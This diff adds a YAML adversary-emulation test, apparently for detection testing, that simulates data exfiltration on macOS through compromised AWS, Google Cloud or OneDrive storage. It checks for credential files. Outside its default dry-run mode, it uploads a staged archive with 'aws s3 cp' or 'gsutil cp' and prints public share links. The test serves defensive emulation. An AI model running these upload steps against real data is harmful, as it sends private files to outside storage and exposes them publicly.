@@ -1,0 +1,204 @@
+id: 020-cloud-storage-abuse
+name: Cloud Storage Abuse
+description: Exfiltrates data through compromised cloud storage accounts and shared links
+api_version: 2.0
+platforms:
+  - os: darwin
+uuid: b1c2d3e4-f510-4a5b-6c7d-8e9f0a1b2c11
+requirements:
+  platforms:
+    - os: darwin
+      min_version: 10.12
+args:
+  data_file:
+    description: File to exfiltrate
+    type: string
+    default: "/tmp/.staging/data.tar.gz"
+  cloud_service:
+    description: Cloud storage service (aws|gcloud|onedrive|box)
+    type: string
+    default: "aws"
+  shared_folder_id:
+    description: Shared folder or team drive ID
+    type: string
+    default: "shared-folder-xyz"
+  public_share_enabled:
+    description: Enable public sharing
+    type: string
+    default: "true"
+  share_password:
+    description: Password for share (if applicable)
+    type: string
+    default: "sharepass123"
+  dry_run:
+    description: Enable dry-run mode
+    type: string
+    default: "true"
+steps:
+  - name: Verify file exists
+    type: command
+    executor: bash
+    command: test -f '{{ args.data_file }}' || (echo "File not found"; exit 1)
+    cleanup: false
+  
+  - name: Check cloud service credentials
+    type: command
+    executor: bash
+    command: |
+      echo "Cloud Storage Service: {{ args.cloud_service }}"
+      echo "Configuration:"
+      echo "  Service: {{ args.cloud_service }}"
+      echo "  Shared folder/team: {{ args.shared_folder_id }}"
+      echo "  Public sharing: {{ args.public_share_enabled }}"
+      
+      case '{{ args.cloud_service }}' in
+        aws)
+          [ -f ~/.aws/credentials ] && echo "  AWS credentials: Found" || echo "  AWS credentials: Not found"
+          ;;
+        gcloud)
+          [ -f ~/.config/gcloud/application_default_credentials.json ] && echo "  Google credentials: Found" || echo "  Google credentials: Not found"
+          ;;
+        onedrive)
+          [ -d ~/OneDrive ] && echo "  OneDrive folder: Found" || echo "  OneDrive folder: Not found"
+          ;;
+        *)
+          echo "  Status: Unknown service"
+          ;;
+      esac
+    cleanup: false
+  
+  - name: Prepare shared link
+    type: command
+    executor: bash
+    command: |
+      echo "Shared Link Configuration:"
+      echo "  File: $(basename '{{ args.data_file }}')"
+      echo "  Service: {{ args.cloud_service }}"
+      echo "  Shared with: {{ args.shared_folder_id }}"
+      
+      if [ '{{ args.public_share_enabled }}' = 'true' ]; then
+        echo "  Public access: Enabled"
+        echo "  Share link type: Public (no authentication required)"
+      else
+        echo "  Public access: Disabled"
+        echo "  Share protection: Password protected"
+      fi
+    cleanup: false
+  
+  - name: Upload to shared cloud folder
+    type: command
+    executor: bash
+    command: |
+      if [ '{{ args.dry_run }}' = 'true' ]; then
+        echo "DRY RUN: Cloud Storage Abuse"
+        echo "Attack scenario:"
+        echo "  1. Compromise cloud account credentials"
+        echo "  2. Access shared team folder or team drive"
+        echo "  3. Upload exfiltrated data to shared location"
+        echo "  4. Create public or password-protected share link"
+        echo "  5. Attacker accesses via share link"
+        echo ""
+        echo "Service: {{ args.cloud_service }}"
+        echo "Upload command example:"
+        
+        case '{{ args.cloud_service }}' in
+          aws)
+            echo "  aws s3 cp '{{ args.data_file }}' s3://bucket/{{ args.shared_folder_id }}/data.tar.gz"
+            ;;
+          gcloud)
+            echo "  gsutil cp '{{ args.data_file }}' gs://bucket/{{ args.shared_folder_id }}/data.tar.gz"
+            ;;
+          onedrive)
+            echo "  onedrive upload '{{ args.data_file }}' /{{ args.shared_folder_id }}/"
+            ;;
+          *)
+            echo "  [service-specific upload command]"
+            ;;
+        esac
+      else
+        echo "Attempting to upload to shared cloud folder..."
+        case '{{ args.cloud_service }}' in
+          aws)
+            aws s3 cp '{{ args.data_file }}' "s3://{{ args.shared_folder_id }}/$(basename '{{ args.data_file }}')" || echo "Upload failed"
+            ;;
+          gcloud)
+            gsutil cp '{{ args.data_file }}' "gs://{{ args.shared_folder_id }}/$(basename '{{ args.data_file }}')" || echo "Upload failed"
+            ;;
+          *)
+            echo "Service {{ args.cloud_service }} not implemented"
+            ;;
+        esac
+      fi
+    cleanup: false
+  
+  - name: Generate share link
+    type: command
+    executor: bash
+    command: |
+      if [ '{{ args.public_share_enabled }}' = 'true' ]; then
+        echo "Share link generated:"
+        
+        case '{{ args.cloud_service }}' in
+          aws)
+            echo "  https://s3.amazonaws.com/{{ args.shared_folder_id }}/$(basename '{{ args.data_file }}')"
+            echo "  (Requires public bucket policy)"
+            ;;
+          gcloud)
+            echo "  https://storage.googleapis.com/{{ args.shared_folder_id }}/$(basename '{{ args.data_file }}')"
+            echo "  (Requires public bucket)"
+            ;;
+          onedrive)
+            echo "  https://[tenant].sharepoint.com/sites/[site]/Shared%20Documents/..."
+            echo "  Password: {{ args.share_password }}"
+            ;;
+          *)
+            echo "  [Generated public share link]"
+            ;;
+        esac
+      fi
+    cleanup: false
+checks:
+  - name: File exists
+    description: Verify file for exfiltration
+    type: command
+    command: test -f '{{ args.data_file }}'
+  
+  - name: Valid cloud service
+    description: Verify cloud service name
+    type: command
+    command: echo '{{ args.cloud_service }}' | grep -qE '^(aws|gcloud|onedrive|box|dropbox|icloud)$' && echo "Valid service"
+tests:
+  dry_run:
+    - name: Test cloud storage abuse (dry-run)
+      description: Test cloud storage abuse scenario
+      type: basic
+      steps:
+        - name: Create test file
+          type: command
+          executor: bash
+          command: echo "Sensitive cloud data" > /tmp/test_cloud.dat
+        
+        - name: Simulate AWS S3 upload
+          type: command
+          executor: bash
+          command: |
+            echo "Cloud Storage Abuse Simulation:"
+            echo "Service: AWS S3"
+            echo "Upload: test_cloud.dat to shared-folder-xyz"
+            echo "Public share: https://s3.amazonaws.com/shared-folder-xyz/test_cloud.dat"
+        
+        - name: Show share configuration
+          type: command
+          executor: bash
+          command: |
+            echo ""
+            echo "Share Settings:"
+            echo "  Public access: Enabled"
+            echo "  Authentication: Not required"
+            echo "  Password: N/A"
+cleanup:
+  - name: Remove test file
+    type: command
+    executor: bash
+    command: rm -f /tmp/test_cloud.dat
+    ignore_errors: true
